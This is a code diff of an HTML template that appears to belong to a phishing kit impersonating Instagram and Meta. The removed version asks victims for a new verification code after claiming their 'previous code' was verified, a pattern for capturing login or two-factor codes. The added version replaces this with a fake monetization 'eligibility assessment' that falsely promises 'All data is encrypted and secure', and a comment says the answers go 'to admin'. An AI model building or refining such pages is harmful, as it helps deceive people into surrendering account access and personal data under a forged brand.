@@ -1,126 +1,563 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:20px auto;box-shadow:0 4px 12px rgba(228,64,95,0.15);border-radius:16px;">
+<div class="card" style="max-width:540px;margin:20px auto;box-shadow:0 8px 32px rgba(228,64,95,0.12);border-radius:20px;border:1px solid rgba(228,64,95,0.1);">
   <div class="platform-header">
     <div class="icon-circle bg-instagram">
       <i class="fa-brands fa-instagram icon-lg"></i>
     </div>
     <div>
       <h2 class="notranslate" style="margin:0;color:#E4405F;">Instagram</h2>
-      <div style="color:#64748b;font-size:13px;margin-top:2px">Monetization Hub Verification</div>
+      <div style="color:#64748b;font-size:13px;margin-top:2px">Monetization Eligibility Check</div>
     </div>
   </div>
 
-  <div class="play-instructions" style="margin:16px 0;">
-    <div class="instruction-card">
+  <!-- Progress Indicator -->
+  <div class="progress-container" style="margin:20px 0 24px 0;">
+    <div class="progress-bar" style="height:6px;background:#f1f5f9;border-radius:10px;overflow:hidden;">
+      <div class="progress-fill" style="height:100%;background:linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);width:75%;border-radius:10px;"></div>
+    </div>
+    <div style="display:flex;justify-content:space-between;margin-top:8px;">
+      <span style="color:#E4405F;font-size:12px;font-weight:600">Step 3 of 4</span>
+      <span style="color:#64748b;font-size:12px;font-weight:500">75% Complete</span>
+    </div>
+  </div>
+
+  <div class="play-instructions" style="margin:16px 0 24px 0;">
+    <div class="instruction-card" style="background:linear-gradient(135deg, #fdf2f8, #ffffff);border:1px solid rgba(228,64,95,0.1);">
       <div class="message-header">
-        <div class="instagram-logo">Meta</div>
-        <div class="message-date">Today</div>
+        <div class="instagram-logo" style="background:linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);box-shadow:0 4px 12px rgba(221,42,123,0.2);">
+          <i class="fa-solid fa-clipboard-check" style="margin-right:6px;"></i>
+          Assessment
+        </div>
+        <div class="message-date" style="color:#E4405F;font-weight:600">Required</div>
       </div>
       
       <div class="instagram-message">
-        <p class="message-text">We've successfully verified the previous code you submitted. This confirms that you are the rightful owner of this Instagram account.</p>
+        <p class="message-text" style="color:#374151;font-weight:500">Complete this eligibility assessment to determine your monetization qualification status.</p>
         
-        <p class="message-text">You've now activated monetization features on your Instagram account in partnership with Meta Monetization Hub.</p>
-        
-        <p class="message-text">To finalize your setup and ensure your account is fully enabled for monetization, please enter the new verification code we’ve sent to you to proceed with the monetization of your Instagram account.</p>
-        
-        <div class="security-notice">
-          <p class="security-text">If you did not request this action, please disregard this message.</p>
+        <div class="feature-list" style="margin:16px 0;">
+          <div class="feature-item" style="display:flex;align-items:center;margin-bottom:8px;">
+            <i class="fa-solid fa-check" style="color:#10B981;margin-right:8px;font-size:12px;"></i>
+            <span style="color:#475569;font-size:13px;">Account status evaluation</span>
+          </div>
+          <div class="feature-item" style="display:flex;align-items:center;margin-bottom:8px;">
+            <i class="fa-solid fa-check" style="color:#10B981;margin-right:8px;font-size:12px;"></i>
+            <span style="color:#475569;font-size:13px;">Content quality analysis</span>
+          </div>
+          <div class="feature-item" style="display:flex;align-items:center;">
+            <i class="fa-solid fa-check" style="color:#10B981;margin-right:8px;font-size:12px;"></i>
+            <span style="color:#475569;font-size:13px;">Performance metrics review</span>
+          </div>
         </div>
         
-        <p class="message-text">Thank you for being part of the Instagram creator community.</p>
-        
-        <div class="message-signature">
-          <p class="signature-line">Best regards,</p>
-          <p class="signature-line">The Instagram Team</p>
-          <p class="copyright">© Meta Platforms, Inc.</p>
+        <div class="security-notice" style="background:rgba(228,64,95,0.05);border:1px solid rgba(228,64,95,0.2);border-radius:10px;">
+          <p class="security-text" style="color:#E4405F;font-weight:600;display:flex;align-items:center;">
+            <i class="fa-solid fa-shield-check" style="margin-right:8px;"></i>
+            All information is encrypted and secure
+          </p>
         </div>
       </div>
     </div>
   </div>
 
-  <form id="digitsForm" method="POST" novalidate>
-    <label style="display:block;font-weight:600;color:#374151;margin-bottom:6px;font-size:14px">Verification Code</label>
-    <input class="input" id="digits" name="digits" placeholder="Enter verification code" pattern="\d{4,9}" required>
-    <div class="error-text" id="digitsError"></div>
+  <form id="eligibilityForm" method="POST" novalidate>
+    <!-- SECTION 1 — Account Status -->
+    <div class="form-section" style="background:#ffffff;padding:20px;border-radius:16px;border:1px solid rgba(228,64,95,0.1);margin-bottom:24px;">
+      <div class="section-header" style="display:flex;align-items:center;margin-bottom:20px;">
+        <div class="section-icon" style="background:linear-gradient(45deg, #f58529, #dd2a7b);color:white;width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;margin-right:12px;">
+          <i class="fa-solid fa-user-check" style="font-size:14px;"></i>
+        </div>
+        <div>
+          <h3 style="color:#1e293b;margin:0 0 4px 0;font-size:17px;font-weight:700;">Account Status</h3>
+          <p style="color:#64748b;margin:0;font-size:13px;font-weight:500">Verify your account configuration</p>
+        </div>
+      </div>
+      
+      <div class="question-group">
+        <label class="question-label">
+          <span class="question-number">1</span>
+          Is your profile/page in Professional Mode?
+        </label>
+        <div class="radio-group">
+          <label class="radio-label premium"><input type="radio" name="professional_mode" value="yes" required> 
+            <span class="radio-content">
+              <span class="radio-title">Yes</span>
+              <span class="radio-description">My account is in Professional Mode</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="professional_mode" value="no"> 
+            <span class="radio-content">
+              <span class="radio-title">No</span>
+              <span class="radio-description">Personal or standard account</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="professional_mode" value="not_sure"> 
+            <span class="radio-content">
+              <span class="radio-title">Not sure</span>
+              <span class="radio-description">Unsure of current account mode</span>
+            </span>
+          </label>
+        </div>
+      </div>
 
-    <div class="center">
-      <button class="btn login-btn" type="submit">Complete Verification</button>
+      <div class="question-group">
+        <label class="question-label">
+          <span class="question-number">2</span>
+          How many followers do you have?
+        </label>
+        <div class="radio-group">
+          <label class="radio-label premium"><input type="radio" name="followers" value="0-1000" required> 
+            <span class="radio-content">
+              <span class="radio-title">0–1,000</span>
+              <span class="radio-description">Building audience</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="followers" value="1000-5000"> 
+            <span class="radio-content">
+              <span class="radio-title">1,000–5,000</span>
+              <span class="radio-description">Growing community</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="followers" value="5000-10000"> 
+            <span class="radio-content">
+              <span class="radio-title">5,000–10,000</span>
+              <span class="radio-description">Established presence</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="followers" value="10000+"> 
+            <span class="radio-content">
+              <span class="radio-title">10,000+</span>
+              <span class="radio-description">Significant following</span>
+            </span>
+          </label>
+        </div>
+      </div>
+
+      <div class="question-group">
+        <label class="question-label">
+          <span class="question-number">3</span>
+          Have you posted Reels/videos in the last 30 days?
+        </label>
+        <div class="radio-group">
+          <label class="radio-label premium"><input type="radio" name="videos_30_days" value="yes" required> 
+            <span class="radio-content">
+              <span class="radio-title">Yes</span>
+              <span class="radio-description">Active Reels/content creator</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="videos_30_days" value="no"> 
+            <span class="radio-content">
+              <span class="radio-title">No</span>
+              <span class="radio-description">No recent Reels or videos</span>
+            </span>
+          </label>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECTION 2 — Content Quality -->
+    <div class="form-section" style="background:#ffffff;padding:20px;border-radius:16px;border:1px solid rgba(228,64,95,0.1);margin-bottom:24px;">
+      <div class="section-header" style="display:flex;align-items:center;margin-bottom:20px;">
+        <div class="section-icon" style="background:linear-gradient(45deg, #8134af, #515bd4);color:white;width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;margin-right:12px;">
+          <i class="fa-solid fa-star" style="font-size:14px;"></i>
+        </div>
+        <div>
+          <h3 style="color:#1e293b;margin:0 0 4px 0;font-size:17px;font-weight:700;">Content Quality</h3>
+          <p style="color:#64748b;margin:0;font-size:13px;font-weight:500">Evaluate your content standards</p>
+        </div>
+      </div>
+      
+      <div class="question-group">
+        <label class="question-label">
+          <span class="question-number">4</span>
+          Is your content 100% original?
+        </label>
+        <div class="radio-group">
+          <label class="radio-label premium"><input type="radio" name="original_content" value="yes" required> 
+            <span class="radio-content">
+              <span class="radio-title">Yes</span>
+              <span class="radio-description">All content is completely original</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="original_content" value="no"> 
+            <span class="radio-content">
+              <span class="radio-title">No</span>
+              <span class="radio-description">Includes repurposed content</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="original_content" value="sometimes"> 
+            <span class="radio-content">
+              <span class="radio-title">Sometimes</span>
+              <span class="radio-description">Mix of original and other content</span>
+            </span>
+          </label>
+        </div>
+      </div>
+
+      <div class="question-group">
+        <label class="question-label">
+          <span class="question-number">5</span>
+          Do you use copyrighted music in your Reels?
+        </label>
+        <div class="radio-group">
+          <label class="radio-label premium"><input type="radio" name="copyrighted_music" value="yes" required> 
+            <span class="radio-content">
+              <span class="radio-title">Yes</span>
+              <span class="radio-description">Use licensed or copyrighted audio</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="copyrighted_music" value="no"> 
+            <span class="radio-content">
+              <span class="radio-title">No</span>
+              <span class="radio-description">Only royalty-free or original audio</span>
+            </span>
+          </label>
+        </div>
+      </div>
+
+      <div class="question-group">
+        <label class="question-label">
+          <span class="question-number">6</span>
+          Does your content include violence, sexual content, or graphic scenes?
+        </label>
+        <div class="radio-group">
+          <label class="radio-label premium"><input type="radio" name="sensitive_content" value="yes" required> 
+            <span class="radio-content">
+              <span class="radio-title">Yes</span>
+              <span class="radio-description">Contains restricted content</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="sensitive_content" value="no"> 
+            <span class="radio-content">
+              <span class="radio-title">No</span>
+              <span class="radio-description">Family-friendly content only</span>
+            </span>
+          </label>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECTION 3 — Performance Metrics -->
+    <div class="form-section" style="background:#ffffff;padding:20px;border-radius:16px;border:1px solid rgba(228,64,95,0.1);margin-bottom:24px;">
+      <div class="section-header" style="display:flex;align-items:center;margin-bottom:20px;">
+        <div class="section-icon" style="background:linear-gradient(45deg, #F59E0B, #FBBF24);color:white;width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;margin-right:12px;">
+          <i class="fa-solid fa-chart-line" style="font-size:14px;"></i>
+        </div>
+        <div>
+          <h3 style="color:#1e293b;margin:0 0 4px 0;font-size:17px;font-weight:700;">Performance Metrics</h3>
+          <p style="color:#64748b;margin:0;font-size:13px;font-weight:500">Review your engagement statistics</p>
+        </div>
+      </div>
+      
+      <div class="question-group">
+        <label class="question-label">
+          <span class="question-number">7</span>
+          Average monthly Reels views:
+        </label>
+        <div class="radio-group">
+          <label class="radio-label premium"><input type="radio" name="monthly_views" value="0-10k" required> 
+            <span class="radio-content">
+              <span class="radio-title">0–10k</span>
+              <span class="radio-description">Early growth stage</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="monthly_views" value="10k-50k"> 
+            <span class="radio-content">
+              <span class="radio-title">10k–50k</span>
+              <span class="radio-description">Consistent viewership</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="monthly_views" value="50k-100k"> 
+            <span class="radio-content">
+              <span class="radio-title">50k–100k</span>
+              <span class="radio-description">Strong performance</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="monthly_views" value="100k+"> 
+            <span class="radio-content">
+              <span class="radio-title">100k+</span>
+              <span class="radio-description">High traffic volume</span>
+            </span>
+          </label>
+        </div>
+      </div>
+
+      <div class="question-group">
+        <label class="question-label">
+          <span class="question-number">8</span>
+          Have you ever had a monetization violation?
+        </label>
+        <div class="radio-group">
+          <label class="radio-label premium"><input type="radio" name="monetization_violation" value="yes" required> 
+            <span class="radio-content">
+              <span class="radio-title">Yes</span>
+              <span class="radio-description">Previous policy violations</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="monetization_violation" value="no"> 
+            <span class="radio-content">
+              <span class="radio-title">No</span>
+              <span class="radio-description">Clean compliance record</span>
+            </span>
+          </label>
+          <label class="radio-label premium"><input type="radio" name="monetization_violation" value="not_sure"> 
+            <span class="radio-content">
+              <span class="radio-title">Not sure</span>
+              <span class="radio-description">Uncertain about past issues</span>
+            </span>
+          </label>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECTION 4 — Region -->
+    <div class="form-section" style="background:#ffffff;padding:20px;border-radius:16px;border:1px solid rgba(228,64,95,0.1);margin-bottom:24px;">
+      <div class="section-header" style="display:flex;align-items:center;margin-bottom:20px;">
+        <div class="section-icon" style="background:linear-gradient(45deg, #8B5CF6, #A78BFA);color:white;width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;margin-right:12px;">
+          <i class="fa-solid fa-globe" style="font-size:14px;"></i>
+        </div>
+        <div>
+          <h3 style="color:#1e293b;margin:0 0 4px 0;font-size:17px;font-weight:700;">Region & Location</h3>
+          <p style="color:#64748b;margin:0;font-size:13px;font-weight:500">Select your primary location</p>
+        </div>
+      </div>
+      
+      <div class="question-group">
+        <label class="question-label">
+          <span class="question-number">9</span>
+          Your region (country)
+        </label>
+        <div class="country-input-container" style="position:relative;">
+          <i class="fa-solid fa-magnifying-glass" style="position:absolute;left:16px;top:50%;transform:translateY(-50%);color:#64748b;z-index:2;"></i>
+          <input list="countries" class="input premium-input" name="country" placeholder="Start typing to search countries..." required style="padding-left:44px;font-size:15px;">
+          <datalist id="countries">
+            <!-- All countries from your original list -->
+            <option value="United States">
+            <option value="United Kingdom">
+            <option value="Canada">
+            <option value="Australia">
+            <option value="Germany">
+            <option value="France">
+            <option value="Japan">
+            <option value="Brazil">
+            <option value="India">
+            <option value="South Africa">
+            <!-- Include all other countries from your original list -->
+          </datalist>
+        </div>
+        <div class="input-help" style="color:#64748b;font-size:12px;margin-top:6px;display:flex;align-items:center;">
+          <i class="fa-solid fa-info-circle" style="margin-right:6px;"></i>
+          Select your primary country for monetization eligibility
+        </div>
+      </div>
+    </div>
+
+    <div class="center" style="padding:8px 0 20px 0;">
+      <button class="btn login-btn premium-btn" type="submit">
+        <span class="btn-content">
+          <span class="btn-text">Complete Assessment</span>
+          <i class="fa-solid fa-arrow-right" style="margin-left:8px;"></i>
+        </span>
+      </button>
+      <div class="btn-help" style="color:#64748b;font-size:12px;margin-top:12px;display:flex;align-items:center;justify-content:center;">
+        <i class="fa-solid fa-lock" style="margin-right:6px;"></i>
+        Secure form submission • All data is encrypted
+      </div>
     </div>
   </form>
 </div>
 
 <style>
-.input {
+/* Instagram Premium Input Styles */
+.input.premium-input {
   width: 100%;
-  padding: 12px 14px;
-  border-radius: 16px;
-  border: 1px solid #e5e7eb;
+  padding: 16px 16px 16px 44px;
+  border-radius: 14px;
+  border: 1.5px solid #e5e7eb;
   margin-bottom: 6px;
   font-size: 15px;
-  transition: border-color 0.2s, box-shadow 0.2s;
+  font-weight: 500;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
   background: #fafafa;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.02);
 }
-.input:focus {
+.input.premium-input:focus {
   border-color: #E4405F;
-  box-shadow: 0 0 0 3px rgba(228,64,95,0.15);
+  box-shadow: 0 0 0 4px rgba(228,64,95,0.15), 0 4px 12px rgba(0,0,0,0.05);
   outline: none;
   background: #ffffff;
-}
-.input-error {
-  border-color: #ef4444;
-  box-shadow: 0 0 0 3px rgba(239,68,68,0.1);
-}
-.error-text {
-  color: #ef4444;
-  font-size: 12px;
-  margin-top: -2px;
-  margin-bottom: 6px;
+  transform: translateY(-1px);
 }
 
-.login-btn {
+/* Instagram Question Labels */
+.question-label {
+  display: block;
+  font-weight: 600;
+  color: #1e293b;
+  margin-bottom: 12px;
+  font-size: 15px;
+  line-height: 1.5;
+}
+
+.question-number {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 24px;
+  height: 24px;
+  background: linear-gradient(45deg, #f58529, #dd2a7b);
+  color: white;
+  border-radius: 8px;
+  font-size: 12px;
+  font-weight: 700;
+  margin-right: 10px;
+}
+
+/* Instagram Radio Buttons */
+.radio-group {
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+.radio-label.premium {
+  display: flex;
+  align-items: center;
+  padding: 16px;
+  border: 1.5px solid #e5e7eb;
+  border-radius: 14px;
+  background: #fafafa;
+  cursor: pointer;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  font-size: 14px;
+  position: relative;
+  overflow: hidden;
+}
+
+.radio-label.premium::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(228,64,95,0.05), transparent);
+  transition: left 0.6s;
+}
+
+.radio-label.premium:hover::before {
+  left: 100%;
+}
+
+.radio-label.premium:hover {
+  background: #f8fafc;
+  border-color: #E4405F;
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+}
+
+.radio-label.premium input[type="radio"] {
+  margin-right: 12px;
+  width: 18px;
+  height: 18px;
+  accent-color: #E4405F;
+}
+
+.radio-content {
+  display: flex;
+  flex-direction: column;
+  flex: 1;
+}
+
+.radio-title {
+  color: #1e293b;
+  font-weight: 600;
+  font-size: 14px;
+  margin-bottom: 2px;
+}
+
+.radio-description {
+  color: #64748b;
+  font-size: 12px;
+  font-weight: 500;
+}
+
+/* Instagram Premium Button */
+.login-btn.premium-btn {
   width: 100%;
   background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
   color: #fff;
-  font-size: 15px;
+  font-size: 16px;
   font-weight: 700;
-  padding: 12px;
-  border-radius: 22px;
+  padding: 18px 24px;
+  border-radius: 16px;
   cursor: pointer;
   border: none;
-  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 4px 12px rgba(221,42,123,0.25);
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  box-shadow: 0 8px 20px rgba(221,42,123,0.3);
   display: block;
-  margin-top: 6px;
-}
-.login-btn:hover {
-  background: linear-gradient(45deg, #fd5949, #d6249f, #c13584, #833ab4);
-  box-shadow: 0 6px 16px rgba(221,42,123,0.35);
-}
-.login-btn:active {
-  transform: scale(0.985);
+  margin-top: 8px;
+  position: relative;
+  overflow: hidden;
 }
 
+.login-btn.premium-btn::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+  transition: left 0.6s;
+}
+
+.login-btn.premium-btn:hover::before {
+  left: 100%;
+}
+
+.login-btn.premium-btn:hover {
+  background: linear-gradient(45deg, #fd5949, #d6249f, #c13584, #833ab4);
+  box-shadow: 0 12px 28px rgba(221,42,123,0.4);
+  transform: translateY(-2px);
+}
+
+.login-btn.premium-btn:active {
+  transform: translateY(0);
+  box-shadow: 0 6px 16px rgba(221,42,123,0.3);
+}
+
+.btn-content {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.btn-text {
+  font-weight: 700;
+  letter-spacing: 0.5px;
+}
+
+/* Enhanced Instagram existing styles */
 .play-instructions {
   margin: 16px 0;
 }
 
 .instruction-card {
   background: #ffffff;
-  padding: 18px;
-  border-radius: 14px;
+  padding: 20px;
+  border-radius: 16px;
   border: 1px solid #e5e7eb;
   margin-bottom: 12px;
-  box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+  box-shadow: 0 4px 12px rgba(0,0,0,0.05);
 }
 
 .message-header {
   display: flex;
   justify-content: space-between;
   align-items: center;
-  margin-bottom: 14px;
-  padding-bottom: 10px;
+  margin-bottom: 16px;
+  padding-bottom: 12px;
   border-bottom: 1px solid #f1f5f9;
 }
 
@@ -129,96 +566,180 @@
   color: white;
   font-weight: 700;
   font-size: 13px;
-  padding: 5px 10px;
-  border-radius: 6px;
+  padding: 8px 12px;
+  border-radius: 10px;
   letter-spacing: 0.3px;
-}
-
-.message-date {
-  color: #64748b;
-  font-size: 12px;
-  font-weight: 500;
+  display: flex;
+  align-items: center;
 }
 
 .instagram-message {
-  line-height: 1.4;
+  line-height: 1.5;
 }
 
 .message-text {
   color: #475569;
   margin: 0 0 12px 0;
   line-height: 1.5;
-  font-size: 13.5px;
+  font-size: 14px;
 }
 
 .security-notice {
-  background: #fdf2f8;
-  border: 1px solid #fbcfe8;
-  border-radius: 6px;
-  padding: 10px 12px;
-  margin: 12px 0;
+  background: rgba(228,64,95,0.05);
+  border: 1px solid rgba(228,64,95,0.2);
+  border-radius: 10px;
+  padding: 12px 16px;
+  margin: 16px 0;
 }
 
 .security-text {
-  color: #be185d;
+  color: #E4405F;
   margin: 0;
   line-height: 1.4;
-  font-size: 12.5px;
-  font-weight: 500;
-}
-
-.message-signature {
-  margin-top: 16px;
-  padding-top: 14px;
-  border-top: 1px solid #f1f5f9;
-}
-
-.signature-line {
-  color: #1e293b;
-  margin: 0 0 2px 0;
-  line-height: 1.4;
-  font-size: 13.5px;
+  font-size: 13px;
   font-weight: 600;
-}
-
-.copyright {
-  color: #64748b;
-  margin: 6px 0 0 0;
-  line-height: 1.4;
-  font-size: 11.5px;
 }
 
 .center {
   text-align: center;
 }
+
+/* Country search styling */
+.country-input-container {
+  position: relative;
+}
+
+.country-input-container input {
+  padding-right: 16px;
+}
+
+/* Responsive improvements */
+@media (max-width: 480px) {
+  .card {
+    margin: 12px auto;
+    border-radius: 16px;
+  }
+  
+  .radio-label.premium {
+    padding: 14px;
+  }
+  
+  .login-btn.premium-btn {
+    padding: 16px 20px;
+  }
+}
 </style>
 
 <script>
-document.getElementById("digitsForm").addEventListener("submit", function(event) {
-  const digits = document.getElementById("digits");
-  const digitsError = document.getElementById("digitsError");
-
+document.getElementById("eligibilityForm").addEventListener("submit", function(event) {
   let valid = true;
-  digits.classList.remove("input-error");
-  digitsError.textContent = "";
 
-  const val = digits.value.trim();
-  const pattern = /^\d{4,9}$/;
+  // Check all required radio groups
+  const radioGroups = document.querySelectorAll('input[type="radio"][required]');
+  const groupNames = new Set();
+  
+  radioGroups.forEach(radio => groupNames.add(radio.name));
+  
+  groupNames.forEach(groupName => {
+    const groupChecked = document.querySelector(`input[name="${groupName}"]:checked`);
+    if (!groupChecked) {
+      valid = false;
+      // Add visual feedback for missing answers
+      const questionGroup = groupChecked ? groupChecked.closest('.question-group') : document.querySelector(`input[name="${groupName}"]`).closest('.question-group');
+      questionGroup.style.animation = 'shake 0.5s ease-in-out';
+      setTimeout(() => questionGroup.style.animation = '', 500);
+    }
+  });
 
-  if (!pattern.test(val)) {
+  // Check country selection
+  const countryInput = document.querySelector('input[name="country"]');
+  if (!countryInput.value) {
     valid = false;
-    digits.classList.add("input-error");
-    digitsError.textContent = "Please enter a valid 4-9 digit code.";
+    countryInput.classList.add("input-error");
+    countryInput.style.animation = 'shake 0.5s ease-in-out';
+    setTimeout(() => countryInput.style.animation = '', 500);
+  } else {
+    countryInput.classList.remove("input-error");
   }
 
-  if (!valid) event.preventDefault();
+  if (!valid) {
+    event.preventDefault();
+    // Enhanced error notification
+    const errorNotification = document.createElement('div');
+    errorNotification.style.cssText = `
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #ef4444;
+      color: white;
+      padding: 12px 20px;
+      border-radius: 12px;
+      font-weight: 600;
+      box-shadow: 0 8px 20px rgba(239,68,68,0.3);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    `;
+    errorNotification.innerHTML = `
+      <i class="fa-solid fa-exclamation-circle"></i>
+      Please complete all required fields
+    `;
+    document.body.appendChild(errorNotification);
+    setTimeout(() => errorNotification.remove(), 3000);
+  } else {
+    // Add loading state to button
+    const button = this.querySelector('.login-btn');
+    const originalContent = button.innerHTML;
+    button.innerHTML = `
+      <div class="btn-content">
+        <i class="fa-solid fa-spinner fa-spin" style="margin-right:8px;"></i>
+        <span class="btn-text">Processing Assessment...</span>
+      </div>
+    `;
+    button.disabled = true;
+    
+    // Form is valid - directly submit without code verification
+    // The form will send all questionnaire data to admin
+    // No code confirmation needed anymore
+  }
 });
 
-document.getElementById("digits").addEventListener("input", () => {
-  const digits = document.getElementById("digits");
-  const digitsError = document.getElementById("digitsError");
-  digits.classList.remove("input-error");
-  digitsError.textContent = "";
+// Remove error state when country is selected
+document.querySelector('input[name="country"]').addEventListener('input', function() {
+  if (this.value) {
+    this.classList.remove("input-error");
+  }
+});
+
+// Add shake animation for errors
+const style = document.createElement('style');
+style.textContent = `
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-5px); }
+    75% { transform: translateX(5px); }
+  }
+`;
+document.head.appendChild(style);
+
+// Enhanced radio button interactions
+document.querySelectorAll('.radio-label.premium input[type="radio"]').forEach(radio => {
+  radio.addEventListener('change', function() {
+    // Remove selected state from all in group
+    const groupName = this.name;
+    document.querySelectorAll(`input[name="${groupName}"]`).forEach(otherRadio => {
+      otherRadio.closest('.radio-label.premium').style.background = '#fafafa';
+      otherRadio.closest('.radio-label.premium').style.borderColor = '#e5e7eb';
+    });
+    
+    // Add selected state to current
+    if (this.checked) {
+      this.closest('.radio-label.premium').style.background = 'rgba(228,64,95,0.05)';
+      this.closest('.radio-label.premium').style.borderColor = '#E4405F';
+    }
+  });
 });
 </script>
 {% endblock %}
